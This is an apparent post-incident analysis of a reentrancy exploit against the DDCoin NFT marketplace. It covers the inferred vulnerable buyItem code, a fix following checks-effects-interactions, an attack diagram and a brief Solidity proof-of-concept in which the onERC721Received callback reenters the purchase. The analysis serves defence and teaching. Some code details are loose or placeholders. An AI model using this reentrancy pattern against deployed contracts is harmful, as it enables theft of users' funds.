# DDCoin — NFT Marketplace Reentrancy Attack Analysis

| Item | Details |
|------|---------|
| **Date** | 2023-06-01 |
| **Protocol** | DDCoin NFT Marketplace |
| **Chain** | BSC |
| **Loss** | ~300K USD |
| **Attacker** | [0x0a3fee89...](https://bscscan.com/address/0x0a3fee894eb8fcb6f84460d5828d71be50612762) |
| **Attack Contract** | [0x105e9b02...](https://bscscan.com/address/0x105e9b0266ae0ae670b7fe9af08cf32049f0dd21) |
| **Attack Tx** | [0xd92bf51b...](https://bscscan.com/tx/0xd92bf51b9bf464420e1261cfcd8b291ee05d5fbffbfbb316ec95131779f80809) |
| **Vulnerable Contract** | [0xb3a636ac...](https://bscscan.com/address/0xb3a636ac4c271e6cd962cad98eae9cf71f5a49c8) |
| **Root Cause** | Reentrancy possible during SellListing processing in NFT Marketplace |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/DDCoin_exp.sol) |

---
## 1. Vulnerability Overview

The DDCoin NFT Marketplace violates the CEI (Checks-Effects-Interactions) pattern by paying out funds to the buyer before transferring the NFT during SellListing processing. An attacker can reenter via the NFT transfer callback (`onERC721Received`) to purchase the same listing repeatedly.

## 2. Vulnerable Code Analysis

```solidity
// ❌ CEI pattern violation: external call before state update
interface IMarketPlace {
    struct SellListing {
        uint256 itemId;
        uint256 index;
    }

    // ❌ No state change before NFT transfer → reentrancy possible
    function buyItem(uint256 itemId) external;
}

// Vulnerable buyItem implementation (inferred)
function buyItem(uint256 itemId) external {
    SellListing storage listing = listings[itemId];
    require(listing.active, "Not active");

    // ❌ Payment transfer (external call 1)
    paymentToken.transferFrom(msg.sender, seller, listing.price);

    // ❌ NFT transfer — triggers onERC721Received callback
    // listing.active is still true at this point
    nft.safeTransferFrom(address(this), msg.sender, listing.tokenId);

    // ❌ State update after NFT transfer — too late
    listing.active = false;
}
```

```solidity
// ✅ Fix: Follow CEI pattern
function buyItem(uint256 itemId) external nonReentrant {
    SellListing storage listing = listings[itemId];
    require(listing.active, "Not active");

    // ✅ Update state first (Effects)
    listing.active = false;

    // ✅ External calls after (Interactions)
    paymentToken.transferFrom(msg.sender, seller, listing.price);
    nft.safeTransferFrom(address(this), msg.sender, listing.tokenId);
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Reentrancy possible during SellListing processing in NFT Marketplace
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
┌──────────────────────────────────────────┐
│  1. Deploy attack contract (onERC721Received) │
└──────────────────────┬───────────────────┘
                       ▼
┌──────────────────────────────────────────┐
│  2. Call buyItem(itemId)                 │
│     Payment sent → NFT transfer begins   │
└──────────────────────┬───────────────────┘
                       ▼
┌──────────────────────────────────────────┐
│  3. onERC721Received callback triggered  │
│     → Reenter: call buyItem(itemId) again│
│     → listing.active still true          │
│     → Double purchase succeeds           │
└──────────────────────┬───────────────────┘
                       ▼
┌──────────────────────────────────────────┐
│  4. Repeated reentrancy drains NFTs      │
│     → 300K USD profit                    │
└──────────────────────────────────────────┘
```

## 4. PoC Code

```solidity
function attack(uint256 itemId) external {
    // 1. Initiate first purchase
    marketplace.buyItem(itemId);
}

// NFT receipt callback — reentrancy entry point
function onERC721Received(
    address, address, uint256 tokenId, bytes calldata
) external returns (bytes4) {
    if (attackCount < MAX_REENTER) {
        attackCount++;
        // ❌ listing.active still true → reentrancy possible
        marketplace.buyItem(itemId);  // reenter
    }
    return this.onERC721Received.selector;
}
```

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|---------------|----------|-----|------------------|
| V-01 | CEI Pattern Violation Reentrancy | CRITICAL | CWE-841 | 01_reentrancy.md |
| V-02 | onERC721Received Callback Reentrancy | HIGH | CWE-362 | 01_reentrancy.md |

## 6. Remediation Recommendations

### Immediate Action
```solidity
// ✅ ReentrancyGuard + CEI pattern
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
function buyItem(uint256 itemId) external nonReentrant {
    listings[itemId].active = false; // Effects first
    // Interactions after
}
```

## 7. Lessons Learned

NFT marketplaces are particularly vulnerable to reentrancy attacks because `safeTransferFrom` triggers the `onERC721Received` callback. Every function involving NFT transfers must apply both `nonReentrant` and the CEI pattern without exception.